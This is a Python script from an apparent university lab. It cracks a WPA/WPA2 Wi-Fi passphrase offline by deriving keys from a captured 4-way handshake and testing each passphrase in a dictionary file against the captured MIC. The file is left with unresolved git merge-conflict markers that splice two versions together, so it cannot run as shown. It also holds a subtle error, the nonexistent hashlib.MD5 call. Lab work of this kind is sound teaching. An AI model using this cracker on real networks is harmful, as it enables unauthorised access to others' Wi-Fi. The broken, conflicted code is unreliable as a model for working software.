#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

<<<<<<< HEAD
__author__      = "Edin Mujkanovic et Daniel Oliveira Paiva"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__     = "GPL"
__version__     = "1.0"
__email__       = "edin.mujkanovic@heig-vd.ch"
=======
__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__     = "GPL"
__version__     = "1.0"
__email__       = "abraham.rubinstein@heig-vd.ch"
>>>>>>> 0c49a6b2f3099ba5f9e11367490a02c2c967e949
__status__      = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
<<<<<<< HEAD
ssid        = wpa[0].info # On récupère le SSID contenu dans la trame 1 dans l'info
APmac       = a2b_hex(str.replace(wpa[5].addr2, ":", "")) # Récupération de l'adresse MAC de l'AP dans la 6ème trame. On enlève les ":".
Clientmac   = a2b_hex(str.replace(wpa[5].addr1, ":", "")) # Récupération de l'adresse MAC du client dans la 6ème trame. On enlève les ":".

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(b2a_hex(wpa[5].load)[26:90]) # Récupèration de l'Authenticator Nonce
SNonce      = a2b_hex(b2a_hex(wpa[6].load)[26:90]) # Récupèration du Supplicant Nonce

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_wanted = wpa[8].load[-18:-2] # Récuperation du MIC envoyé par le client
=======
ssid        = wpa[0].info
APmac       = a2b_hex(str.replace(wpa[5].addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(wpa[5].addr1, ":", ""))

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(b2a_hex(wpa[5].load)[26:90])
SNonce      = a2b_hex(b2a_hex(wpa[6].load)[26:90])

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_wanted = wpa[8].load[-18:-2]
>>>>>>> 0c49a6b2f3099ba5f9e11367490a02c2c967e949


B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

ea = wpa[8][EAPOL] # On recupere la couche EAPOL de la trame
<<<<<<< HEAD
data =  hex(ea.version)[2:].zfill(2) # On récupère le numéro de version
data += hex(ea.type)[2:].zfill(2) # On récupère le type
data += hex(ea.len)[2:].zfill(4) # On récupère la longueur des données de la trame
data += (wpa[8].load[:-18]).hex() # On récupère toutes les données sauf le MIC et la longueur de la clé WPA
data += '0' * 32 # On remplace le MIC par des 0
data += (wpa[8].load[-2:]).hex() # On récupère la longueur de la clé WPA
data = a2b_hex(data) # Transformation en données binaires
algorithmeWPA = (wpa[8].load[1:3])[1] & 2 # On récupère la "Key Descriptor Version" afin de pouvoir déterminter plus tard quel algorithme utiliser (MD5 ou SHA1)


currentMic = ""
currentPass = ""

# On ouvre le dictionnaire contenant les passphrase à tester
with open('dictionnary') as dictionnary:
    # On parcourt toutes les passphrase
    for currentPass in dictionnary:
        currentPass = currentPass[:-1] # On enleve le \n
        currentPass = str.encode(currentPass) # On transforme la string en bytes
        pmk = None
        # On définit quel algorithme de hashage il faut utiliser selon le numéro de version
        if(algorithmeWPA == 2):
            pmk = pbkdf2(hashlib.sha1,currentPass, ssid, 4096, 32)
        else:
            pmk = pbkdf2(hashlib.MD5,currentPass, ssid, 4096, 32)  

=======
data =  hex(ea.version)[2:].zfill(2)
data += hex(ea.type)[2:].zfill(2)
data += hex(ea.len)[2:].zfill(4)
data += (wpa[8].load[:-18]).hex()
data += '0' * 32 
data += (wpa[8].load[-2:]).hex()
data = a2b_hex(data)


currentMic = ""
#dictionnary = open("dictionnary", "r")
currentPass = ""
#print("MIC WANTED " + mic_wanted)
with open('dictionnary') as dictionnary:
    for currentPass in dictionnary:
        currentPass = currentPass[:-1] # On enleve le \n
        currentPass = str.encode(currentPass)
        pmk = pbkdf2(hashlib.sha1,currentPass, ssid, 4096, 32)
>>>>>>> 0c49a6b2f3099ba5f9e11367490a02c2c967e949
        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)
        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)
        mic = mic.hexdigest()[0:32]
<<<<<<< HEAD
        print("Testing passphrase : " + currentPass.decode("utf-8"))
        # On verifie que le mic calculé correspond au mic souhaité. Si oui, on a trouvé la passphrase. Si non, on teste la passphrase suivante.
=======
>>>>>>> 0c49a6b2f3099ba5f9e11367490a02c2c967e949
        if(mic == mic_wanted.hex()):
            print("Passphrase found : " + currentPass.decode("utf-8"))
            exit(1)

